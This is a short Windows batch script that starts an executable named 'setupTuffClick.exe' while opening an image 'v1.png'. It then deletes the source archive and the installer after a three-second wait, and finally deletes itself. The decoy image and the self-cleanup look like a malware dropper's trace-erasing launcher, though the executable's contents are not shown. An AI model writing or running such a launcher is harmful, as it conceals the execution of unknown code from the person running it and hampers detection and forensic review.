@echo off
start setupTuffClick.exe
start v1.png
del tuff.7z
timeout /t 3
del setupTuffClick.exe

start /b "" cmd /c del "%~f0"&exit /b
